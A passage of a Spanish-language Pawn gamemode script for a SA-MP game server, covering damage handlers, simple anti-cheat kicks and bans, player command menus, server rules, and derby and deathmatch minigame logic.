    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER || PLAYER_STATE_ONFOOT != PLAYER_STATE_DRIVER)
    {
        if(hittype != BULLET_HIT_TYPE_NONE)
        {
            if((fX <= -1000.0 || fX >= 1000.0) || (fY <= -1000.0 || fY >= 1000.0) || (fZ <= -1000.0 || fZ >= 1000.0) || ((hittype != BULLET_HIT_TYPE_PLAYER) && (hittype != BULLET_HIT_TYPE_VEHICLE) && (hittype != BULLET_HIT_TYPE_OBJECT) && (hittype != BULLET_HIT_TYPE_PLAYER_OBJECT)))
            {
                format(UsandoWeaponHacks,sizeof(UsandoWeaponHacks),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Posible Bullet Crasher)",PlayerName2(playerid),playerid);
     			SendClientMessageToAll(red, UsandoWeaponHacks);
     			SaveToFile("KickLog",UsandoWeaponHacks);
		    	Kick(playerid);
            }
        }
    }
    return 1;
}

public OnPlayerFakeConnect(playerid)
{
	new string[128];
	format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido baneado. {FF0000}(Posible Raksamp)",PlayerName2(playerid),playerid);
	SendClientMessageToAll(red, string);
	SaveToFile("BanLog",string);
	BanEx(playerid, "Baneado por intento de Raksamp");
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid)
{
	if(GetPlayerWeapon(playerid) && 34 && 30 && 31 && 32 && 28 && 29 && 22 && 23 && 24 && 33 && 25 && 26 && 27)
	{
		if(BalasExplosivas[playerid] == 1)
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(damagedid, x, y, z);
			CreateExplosion(x, y, z, 12, 10.0);
		}
		if(BalasSniperDM[playerid]==1)
		{
			new Float:x, Float:y, Float:z;
			GetPlayerPos(damagedid, x, y, z);
			CreateExplosion(x, y, z, 0, 10.0);
		}
	}
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
	/*new DeatshotW = GetPlayerWeapon(playerid);
	if(DeatshotW == 34)
	{
		SetPlayerHealth(playerid, 0.0);
		SendClientMessage(playerid, -1, "{FF0000}[INFO]: {FFFFFF}Has sido matado con deathshoot.");
		SendClientMessage(issuerid, -1, "{FF0000}[INFO]: {FFFFFF}Mataste con deathshoot.");
	}*/
	if(issuerid != INVALID_PLAYER_ID)
	{
        if(weaponid > 21 && weaponid < 35)
 		{
		    PlayerPlaySound(issuerid, 17802, 0.0, 0.0, 0.0);
		    PlayerPlaySound(playerid, 17802, 0.0, 0.0, 0.0);
        }
	}
	if(issuerid != INVALID_PLAYER_ID)
    {
        new string[50];
        format(string, sizeof(string), "~n~~n~~n~~n~~r~-%.0f",amount);
	    GameTextForPlayer(playerid, string, 2500,3);
	    format(string, sizeof(string), "~n~~n~~n~~n~~g~-%.0f",amount);
	    GameTextForPlayer(issuerid, string, 2500,3);
    }
	return 1;
}
//===================================Commands===================================
CMD:bizcmds(playerid,params[]){
	#pragma unused params
 	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE NEGOCIOS", "{C0C0C0}/BUYBIZ\t{FF0000}PARA COMPRAR UN NEGOCIO.\n{C0C0C0}/SELLBIZ\t{FF0000}PARA VENDER EL NEGOCIO.\n{C0C0C0}/CASHBOX\t{FF0000}PARA RECOGER LAS GANANCIAS DEL NEGOCIO.\n{C0C0C0}/GOTOBIZ\t{FF0000}PARA IR HACIA TU NEGOCIO.", "Aceptar", "");
	return 1;
}
CMD:bankcmds(playerid,params[]){
	#pragma unused params
 	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE BANCO", "{C0C0C0}/BANK\t\t{FF0000}PARA IR AL BANCO.\n{C0C0C0}/EXITBANK\t{FF0000}PARA SALIR DEL BANCO.\n{C0C0C0}/ROBBANK\t{FF0000}PARA ROBAR EL BANCO.\n{C0C0C0}/BALANCE\t{FF0000}PARA VER CUANTO DINERO TIENES DEPOSITADO.\n{C0C0C0}/DEPOSIT\t{FF0000}PARA DEPOSITAR DINERO.\n{C0C0C0}/WITHDRAW\t{FF0000}PARA SACAR DINERO DEPOSITADO.", "Aceptar", "");
	return 1;
}
CMD:vehcmds(playerid,params[]){
	#pragma unused params
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE VEHICULOS", "{C0C0C0}/VBUY\t\t{FF0000}PARA COMPRAR UN VEHICULO.\n{C0C0C0}/VSELL\t\t{FF0000}PARA VENDER EL VEHICULO.\n{C0C0C0}/VPARK\t\t{FF0000}PARA APARCAR EL VEHICULO.\n{C0C0C0}/VCALL\t\t{FF0000}PARA SPAWNEAR LOS VEHICULOS COMPRADOS.\n{C0C0C0}/VLOCK\t\t{FF0000}PARA BLOQUEAR EL VEHICULO.\n{C0C0C0}/VUNLOCK\t{FF0000}PARA DESBLOQUEAR EL VEHICULO.\n{C0C0C0}/VEH\t\t{FF0000}PARA SPAWNEAR UN VEHICULO.", "Aceptar", "");
	return 1;
}
CMD:housecmds(playerid,params[]){
	#pragma unused params
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{FF0000}COMANDOS DE CASAS", "{C0C0C0}/BUYH\t\t{FF0000}PARA COMPRAR UNA CASA.\n{C0C0C0}/SELLH\t\t{FF0000}PARA VENDER LA CASA.\n{C0C0C0}/GOTOH\t\t{FF0000}PARA IR HACIA LA CASA\n{C0C0C0}/ENTERH\t{FF0000}PARA ENTRAR A LA CASA.\n{C0C0C0}/EXITH\t\t{FF0000}PARA SALIR DE LA CASA.\n{C0C0C0}/LOCKH\t\t{FF0000}PARA BLOQUEAR LA CASA.\n{C0C0C0}/UNLOCKH\t{FF0000}PARA DESBLOQUEAR LA CASA.", "Aceptar", "");
	return 1;
}
CMD:othercmds(playerid,params[]){
    #pragma unused params
	new OtherCmds[1300];
	strcat(OtherCmds, "{C0C0C0}/REGLAS\t{FF0000}    PARA VER LAS REGLAS DEL SERVIDOR.\n");
 	strcat(OtherCmds, "{C0C0C0}/ARMAS\t{FF0000}    PARA SACAR ARMAS.\n");
 	strcat(OtherCmds, "{C0C0C0}/AFK\t\t{FF0000}    PARA ENTRAR EN MODO AFK.\n");
 	strcat(OtherCmds, "{C0C0C0}/SALIRAFK\t{FF0000}    PARA SALIR DEL MODO AFK.\n");
 	strcat(OtherCmds, "{C0C0C0}/TP\t\t{FF0000}    PARA HACER TP HACIA OTRO JUGADOR.\n");
 	strcat(OtherCmds, "{C0C0C0}/DTP\t\t{FF0000}    PARA QUE NO PUEDAN HACER TP HACIA TI.\n");
 	strcat(OtherCmds, "{C0C0C0}/ATP\t\t{FF0000}    PARA QUE PUEDAN HACER TP HACIA TI.\n");
 	strcat(OtherCmds, "{C0C0C0}/TELES\t\t{FF0000}    PARA ABRIR EL MENU DE TELETRANSPORTACIONES.\n");
 	strcat(OtherCmds, "{C0C0C0}/COLORES\t{FF0000}    PARA CAMBIAR EL COLOR DE TU NICK.\n");
 	strcat(OtherCmds, "{C0C0C0}/OBJETOS\t{FF0000}    PARA PONERTE OBJETOS.\n");
 	strcat(OtherCmds, "{C0C0C0}/ESTILOS\t{FF0000}    PARA CAMBIAR EL ESTILO DE PELEA.\n");
 	strcat(OtherCmds, "{C0C0C0}/SKIN\t\t{FF0000}    PARA CAMBIAR DE SKIN.\n");
 	strcat(OtherCmds, "{C0C0C0}/SALIR\t\t{FF0000}    PARA SALIR DE UN MINIJUEGO.\n");
 	strcat(OtherCmds, "{C0C0C0}/DIA\t\t{FF0000}    PARA PONER DE DIA.\n");
 	strcat(OtherCmds, "{C0C0C0}/NOCHE\t\t{FF0000}    PARA PONER DE NOCHE.\n");
 	strcat(OtherCmds, "{C0C0C0}/DARDINERO\t{FF0000}    PARA REGALAR DINERO.\n");
 	strcat(OtherCmds, "{C0C0C0}/CONTEO\t{FF0000}    PARA INICIAR UN CONTEO.\n");
 	strcat(OtherCmds, "{C0C0C0}/HOLATODOS\t{FF0000}    PARA SALUDAR A TODOS.\n");
 	strcat(OtherCmds, "{C0C0C0}/CHAUTODOS\t{FF0000}    PARA DESPEDIRTE DE TODOS.\n");
	strcat(OtherCmds, "{C0C0C0}/PARACAIDAS\t{FF0000}    PARA SACAR UN PARACAIDAS.\n");
	strcat(OtherCmds, "{C0C0C0}/BUGS\t\t{FF0000}    PARA REPORTAR BUGS DEL SERVIDOR.\n");
	strcat(OtherCmds, "{C0C0C0}/SUGERENCIAS\t{FF0000}    SUGERIR MEJORAS PARA EL SERVIDOR.\n");
	ShowPlayerDialog(playerid,OtherCmds2, DIALOG_STYLE_MSGBOX, "{FF0000}OTROS COMANDOS {FFFFFF}[1/3]", OtherCmds, ">>", "Salir");
	return 1;
}
CMD:reglas(playerid,params[]){
	#pragma unused params
    new Reglas[1500];
    strcat(Reglas, "{FF0000}» Reglamentos:\n\n");
    strcat(Reglas, "{FF0000}* {FFFFFF}No cheats,hacks o usar mods que tengan ventaja sobre otro jugador\n\n");
    strcat(Reglas, "{FF0000}* {FFFFFF}No racismo,Spam,flood o insultar a los demas jugadores\n\n");
    strcat(Reglas, "{FF0000}* {FFFFFF}No evadas kill (ESC para no morir, teletransportarte o con comandos)\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No hacer spawn killing o 'camping' en el punto donde los jugadores aparecen\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No interferir en duelos,eventos o torneos\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No hacer carkill/helikill o seras kickeado y si lo haces mucho seras baneado\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No hacer spam en el chat (Publicidad,IP's,Paginas externas al server)\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No convencer a las personas a escribir /q o /quit.. o Seras baneado.\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}Prohibido El Mod matrix en eventos, duelos y torneos\n\n");
	strcat(Reglas, "{FF0000}* {FFFFFF}No pedir ADMIN ni VIP. Si quiere gánaselo.\n\n");
    ShowPlayerDialog(playerid, 213, DIALOG_STYLE_MSGBOX, " ", Reglas, "OK", "");
    PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
	return 1;
}
   	
CMD:sugerencia(playerid, params[])
{
	ShowPlayerDialog(playerid, DIALOG_SUGERENCIA, DIALOG_STYLE_INPUT, "Sugerencia", "Describe la sugerencia que deseas darle al servidor, esta sera guaradada en la base de datos.\nUn administrador la leera.", "Aceptar", "Cancelar");
	return 1;
}

CMD:bug(playerid, params[])
{
	ShowPlayerDialog(playerid, DIALOG_BUG, DIALOG_STYLE_INPUT, "Bug", "Describe el bug que viste, tu reporte sera guardado en la base de datos.\nUn administrador lo leera.", "Aceptar", "Cancelar");
	return 1;
}

CMD:vcontrol(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, red, "|Info| »{EAEAEA} Debes estar en un vehiculo para usar este comando.");
	ShowPlayerDialog(playerid, DIALOGO_CONTROL, DIALOG_STYLE_LIST,"Control del vehiculo", "Luces(encender-apagar)\nCapo (abrir-cerrar)\nMaletero/Baul (abrir-cerrar)\nMotor (encender-apagar)\nAlarma (encender-apagar)", "Aceptar", "Cancelar");
	return 1;
}

CMD:metalhead(playerid,params[]){
	SetPlayerAttachedObject(playerid, 0, 19033, 2, 0.100999, 0.030999, 0.003999, 85.300003, 81.799995, -0.499999, 1.000000, 1.000000, 1.000000);
	SetPlayerAttachedObject(playerid, 1, 19521, 0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
	SetPlayerAttachedObject(playerid, 2, 19096, 2, 0.147000, -0.000999, 0.000000, 0.000000, 0.000000, -10.800001, 1.118000, 1.225000, 1.142001);
	SetPlayerAttachedObject(playerid, 3, 19319, 1, -0.009000, -0.100999, -0.017999, 4.699999, 41.299999, 0.099998, 1.018999, 0.883999, 0.995000);
	return 1;
}
CMD:teles(playerid,params[]){
	ShowPlayerDialog(playerid, Teles, DIALOG_STYLE_LIST,"Teletransportaciones", "{FF0000}*{FFFFFF} Ciudades y Aeropuertos\n{FF0000}*{FFFFFF} Deathmatchs\n{FF0000}*{FFFFFF} Parkours\n{FF0000}*{FFFFFF} Paracaidismos\n{FF0000}*{FFFFFF} Lugares\n{FF0000}*{FFFFFF} Rampas\n{FF0000}*{FFFFFF} Garaje Tuning", "Seleccionar", "Salir");
	return 1;
}

CMD:comandos(playerid,params[]) {
	#pragma unused params
	ShowPlayerDialog(playerid, Comandos, DIALOG_STYLE_LIST, "Comandos", "{FF0000}*{FFFFFF} Comandos de casas {52C433}(/HouseCmds)\n{FF0000}*{FFFFFF} Comandos de negocios {52C433}(/BizCmds)\n{FF0000}*{FFFFFF} Comandos de vehiculos {52C433}(/VehCmds)\n{FF0000}*{FFFFFF} Comandos de banco {52C433}(/BankCmds)\n{FF0000}*{FFFFFF} Otros comandos {52C433}(/OtherCmds)\n{FF0000}*{FFFFFF} Comandos de vip {52C433}(/VipCmds)\n{FF0000}*{FFFFFF} Comandos de admin {52C433}(/AdminCmds)", "Seleccionar", "Salir");
	return 1;
}


CMD:nextderby(playerid, params[])
{
	if(IsPlayerAdmin(playerid))
	{
		if(DI[STATUS] == DERBY_RUNNING)
		{
			DI[TIME_OUT_COUNTER] = 3;
			SendClientMessage(playerid, -1, "Siguiente DERBY en 3 segundos.");
		}
		else SendClientMessage(playerid, -1, "DERBY no está activo.");
		return 1;
	}
	return 0;
}

CMD:did(playerid, params[])
{
	if(IsPlayerAdmin(playerid))
	{
		if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, -1, "USO: /did <id>");
		if(params[0] < 0) return SendClientMessage(playerid, -1, "Map ID no válida.");
		if(isnull( DERBY_FILE_INFO[ params[0] ][DERBY_NAME] )) return SendClientMessage(playerid, -1, "Map ID no válida.");
		if(!DERBY_FILE_INFO[ params[0] ][DERBY_FILE_VALID]) return SendClientMessage(playerid, -1, "Este mapa no se pudo verificar.");
		if(DI[STATUS] == DERBY_CLOSED)
		{
			DI[MAP_ID] = params[0];

			new str[128]; format(str, 128, "Derby está cerrado cuando se active comenzará por el derby #%d, nombre: '%s'", DI[MAP_ID], DERBY_FILE_INFO[ DI[MAP_ID] ][DERBY_NAME]);
			SendClientMessage(playerid, -1, str);
		}
		else
		{
			DI[MAP_ID] = params[0] - 1;

			new str[128]; format(str, 128, "Derby está activo, el próximo derby será el derby #%d, nombre: '%s'", DI[MAP_ID] + 1, DERBY_FILE_INFO[ DI[MAP_ID] + 1 ][DERBY_NAME]);
			SendClientMessage(playerid, -1, str);
		}
		return 1;
	}
	return 0;
}

CMD:close(playerid, params[])
{
	if(IsPlayerAdmin(playerid))
	{
		CloseDerby();
		SendClientMessage(playerid, -1, "Derby cerrado.");
		return 1;
	}
	return 0;
}

CMD:reload(playerid, params[])
{
	if(IsPlayerAdmin(playerid))
	{
		LoadDerbyNames("DERBY/lista_derby.txt");
		CheckDerbys();

		new str[128]; format(str, 128, "Se han cargado %d mapas, se han verificado %d.", TOTAL_DERBYS, TOTAL_DERBYS_OK);
		SendClientMessage(playerid, -1, str);
		return 1;
	}
	return 0;
}

//==========================COMANDO PARA SALIR DE MINIJUEGOS========================================//
CMD:salir(playerid,params[])
{
	if(BloquearComandosInDerby[playerid]==1 || Joined[playerid] == true || BloquearComandosInDM[playerid] == 1 || GetPlayerInterior(playerid)>0){
		if(BloquearComandosInDerby[playerid]==1){
			BloquearComandosInDerby[playerid] = 0;
			if(PI[playerid][P_GAMEMODE] == GAME_DERBY) KickPlayerFromDerby(playerid, true);
			Derby[InDerby]--;
			SpawnPlayer(playerid);
			SetPlayerHealth(playerid, 100);
			SetPlayerArmour(playerid, 100);
			TextDrawHideForPlayer(playerid, TDerby);
			TextDrawHideForPlayer(playerid, TJugadores);
			TextDrawHideForPlayer(playerid, TComandosDM);
			new string[10];
			format(string,sizeof(string),"%d", Derby[InDerby]);
			TextDrawSetString(TJugadores2, string);
			TextDrawHideForPlayer(playerid, TJugadores2);
			TextDrawShowForPlayer(playerid, TComandos);
			return 1;
		}
		if(Joined[playerid] == true){
			JoinCount--;
			Joined[playerid] = false;
			SetPVarInt(playerid, "JoinedToRRAce", false);
			DestroyVehicle(CreatedRaceVeh[playerid]);
			DisablePlayerRaceCheckpoint(playerid);
			CPProgess[playerid] = 0;
			KillTimer(InfoTimer[playerid]);
			TogglePlayerControllable(playerid, true);
			SetCameraBehindPlayer(playerid);
			Race[InRace]--;
			pRace[playerid][pInRace] = 0;
			BloquearComandosInRace[playerid] = 0;
			TextDrawHideForPlayer(playerid, TRace);
			TextDrawHideForPlayer(playerid, TRaceTiempoRestante);
			TextDrawHideForPlayer(playerid, TRaceJugadores);
			TextDrawHideForPlayer(playerid, TCheckpoint);
			TextDrawHideForPlayer(playerid, TRaceTiempoRestante2[playerid]);
			TextDrawHideForPlayer(playerid, TRaceJugadores2[playerid]);
			TextDrawHideForPlayer(playerid, TCheckpoint2[playerid]);
			TextDrawShowForPlayer(playerid, TComandos);
			SpawnPlayer(playerid);
			//PlayerInfo[playerid][DoorsLocked] = 0;
			#if defined RACE_IN_OTHER_WORLD
			SetPlayerVirtualWorld(playerid, 0);
			#endif
			return 1;
		}
		if(BloquearComandosInDM[playerid] == 1){
			new Float:health;
			new PlayerName[MAX_PLAYER_NAME];
			GetPlayerName(playerid, PlayerName, MAX_PLAYER_NAME);
			GetPlayerHealth(playerid,health);
			if(health >= 30)
			{
				if(pDeathmatch[playerid][pInDM1])
				{
					pDeathmatch[playerid][pInDM1]=0;
					Deathmatch[InDM1]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del deathmatch 1. {00BFFF}(/Salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InDM1]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInDM2])
				{
					pDeathmatch[playerid][pInDM2]=0;
					Deathmatch[InDM2]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del deathmatch 2. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InDM2]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInDM3])
				{
					pDeathmatch[playerid][pInDM3]=0;
					Deathmatch[InDM3]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del deathmatch 3. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InDM3]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInDM4])
				{
					pDeathmatch[playerid][pInDM4]=0;
					Deathmatch[InDM4]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del deathmatch 4. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InDM4]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInMiniDM])
				{
					pDeathmatch[playerid][pInMiniDM]=0;
					Deathmatch[InMiniDM]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del mini deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InMiniDM]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInMiniDM2])
				{
					pDeathmatch[playerid][pInMiniDM2]=0;
					Deathmatch[InMiniDM2]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del mini deathmatch 2. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InMiniDM2]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInDesmadre])
				{
					pDeathmatch[playerid][pInDesmadre]=0;
					Deathmatch[InDesmadre]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio de desmadre. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InDesmadre]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInBoxDM])
				{
					pDeathmatch[playerid][pInBoxDM]=0;
					Deathmatch[InBoxDM]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del box deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InBoxDM]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInProDM])
				{
					pDeathmatch[playerid][pInProDM]=0;
					Deathmatch[InProDM]--;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del pro deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InProDM]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInMinigunDM])
				{
					pDeathmatch[playerid][pInMinigunDM]=0;
					Deathmatch[InMinigunDM]--;
					ArmasProhibidas[playerid]=1;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del minigun deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InMinigunDM]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInSniperDM])
				{
					pDeathmatch[playerid][pInSniperDM]=0;
					Deathmatch[InSniperDM]--;
					BalasSniperDM[playerid]=0;
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del sniper deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InSniperDM]);
					TextDrawSetString(TJugadores2, string);
				}
				if(pDeathmatch[playerid][pInGuerraDM])
				{
					pDeathmatch[playerid][pInGuerraDM]=0;
					Deathmatch[InGuerraDM]--;
					ArmasProhibidas[playerid]=1;
					SetPlayerWeather(playerid, 0);
					format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}salio del guerra deathmatch. {00BFFF}(/salir)",PlayerName);
					SendClientMessageToAll(red, fString);
					new string[10];
					format(string,sizeof(string),"%d", Deathmatch[InGuerraDM]);
					TextDrawSetString(TJugadores2, string);
				}
				TextDrawHideForPlayer(playerid, TDeathmatch);
				TextDrawHideForPlayer(playerid, TJugadores);
				TextDrawHideForPlayer(playerid, TJugadores2);
				TextDrawHideForPlayer(playerid, TComandosDM);
				TextDrawShowForPlayer(playerid, TComandos);
				BloquearComandosInDM[playerid] = 0;
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerInterior(playerid,0);
				SpawnPlayer(playerid);
				return 1;
			}
			else
			{
				return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes teletransportarte con poca vida.");
			}
		}
		if(GetPlayerInterior(playerid)==playerinterior[playerid])
		{
			SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
			TogglePlayerControllable(playerid, 0);
			SetPlayerPos(playerid, housex, housey, housez);
			SetPlayerInterior(playerid, playerworld[playerid]);
			SetPlayerVirtualWorld(playerid, 0);
			return 1;
		}
	}else{
		return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No estas en ningun minijuego ni casa.");
	}
	return 1;
}

CMD:derby(playerid, params[])
{
	if(PI[playerid][P_STATUS] != STATUS_SPAWNED) return SendClientMessage(playerid, -1, "No puedes usar este comando por que no has spawneado.");
	if(PI[playerid][P_GAMEMODE] == GAME_DERBY) return SendClientMessage(playerid, -1, "Ya estás en derby.");
	if(DI[PLAYERSD] >= MAX_DERBY_PLAYERS) return SendClientMessage(playerid, -1, "Derby está completo.");
	BloquearComandosInDerby[playerid] = 1;
	AceleracionBrutal[playerid]=false;
	SaltosVehiculo[playerid]=false;
	Derby[InDerby]++;
	TextDrawHideForPlayer(playerid, TComandos);
	TextDrawShowForPlayer(playerid, TDerby);
	TextDrawShowForPlayer(playerid, TJugadores);
	TextDrawShowForPlayer(playerid, TComandosDM);
	TextDrawShowForPlayer(playerid, TJugadores2);
	new string[10];
	format(string,sizeof(string),"%d", Derby[InDerby]);
	TextDrawSetString(TJugadores2, string);
	switch(DI[STATUS])
	{
		case DERBY_CLOSED:
		{
			if(TOTAL_DERBYS == 0) return SendClientMessage(playerid, -1, "No existe ningún derby.");
			if(TOTAL_DERBYS_OK == 0) return SendClientMessage(playerid, -1, "No se pudo verificar ningún derby.");

			new found, id = DI[MAP_ID];
			while(!found)
			{
				if(id >= TOTAL_DERBYS) id = 0;
				if(DERBY_FILE_INFO[id][DERBY_FILE_VALID])
				{
					found = true;
					DI[MAP_ID] = id;
					break;
				}

				id ++;
			}
			if(!LoadDerby(DERBY_FILE_INFO[ DI[MAP_ID] ][DERBY_NAME]))
			{
				CloseDerby();
				SendClientMessage(playerid, -1, "Derby no pudo cargar.");
				return 1;
			}

			DI[STATUS] = DERBY_WAIT;
			DI[PLAYERSD] = 0;
			DI[COUNTDOWN_COUNTER] = DERBY_TIME_COUNTDOWN + 1;
			DI[TEXTDRAW_ANIMATION] = 0;
			TextDrawSetString(TD_DERBY_Message, WaitTextDrawAnimation[ DI[TEXTDRAW_ANIMATION] ]);
			KillTimer(DI[COUNTDOWN_TIMER]);
			DI[COUNTDOWN_TIMER] = SetTimer("DerbyCountdown", 900, true);
			SendClientMessageToAll(-1, "{FF0000}|Derby| »{EAEAEA}En 30 segundos el {FFFFFF}Derby comenzará! Escribe {A9A9A9}/entrard {EAEAEA}para participar");
			SendClientMessage(playerid,COLOR_ROJO,"|Info| »{EAEAEA}Si quieres salir del minijuego derby usa {C0C0C0}/salir.");
			PI[playerid][P_DERBY_SLOT] = GetDerbyVehicleSlot();
			if(PI[playerid][P_DERBY_SLOT] == -1) return KickPlayerFromDerby(playerid, true);
			DI[PLAYERSD] ++;

			DERBY_SLOT_USED[ PI[playerid][P_DERBY_SLOT] ] = true;
			PI[playerid][P_GAMEMODE] = GAME_DERBY;
			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerInterior(playerid, 0);
			ResetPlayerWeapons(playerid);
			SetPlayerVirtualWorld(playerid, DERBY_VIRTUAL_WORLD);

			if(IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
			{
				DestroyVehicle(PI[playerid][P_DERBY_VEHICLEID]);
				PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
			}
			TogglePlayerControllable(playerid, true);
			PI[playerid][P_DERBY_STATUS] = PD_NORMAL;
			PI[playerid][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3], -1, -1, -1, false);
			SetVehicleParamsEx(PI[playerid][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
			SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
			PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
			TextDrawShowForPlayer(playerid, TD_DERBY_Message);
			GameTextForPlayer(playerid, DI[NAME], 3000, 6);
		}
		case DERBY_WAIT:
		{
			PI[playerid][P_DERBY_SLOT] = GetDerbyVehicleSlot();
			if(PI[playerid][P_DERBY_SLOT] == -1) return KickPlayerFromDerby(playerid, true);
			DI[PLAYERSD] ++;

			DERBY_SLOT_USED[ PI[playerid][P_DERBY_SLOT] ] = true;
			PI[playerid][P_GAMEMODE] = GAME_DERBY;

			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerInterior(playerid, 0);
			ResetPlayerWeapons(playerid);
			SetPlayerVirtualWorld(playerid, DERBY_VIRTUAL_WORLD);

			if(IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
			{
				DestroyVehicle(PI[playerid][P_DERBY_VEHICLEID]);
				PI[playerid][P_DERBY_VEHICLEID] = INVALID_VEHICLE_ID;
			}
			TogglePlayerControllable(playerid, true);
			PI[playerid][P_DERBY_STATUS] = PD_NORMAL;
			PI[playerid][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3], -1, -1, -1, false);
			SetVehicleParamsEx(PI[playerid][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
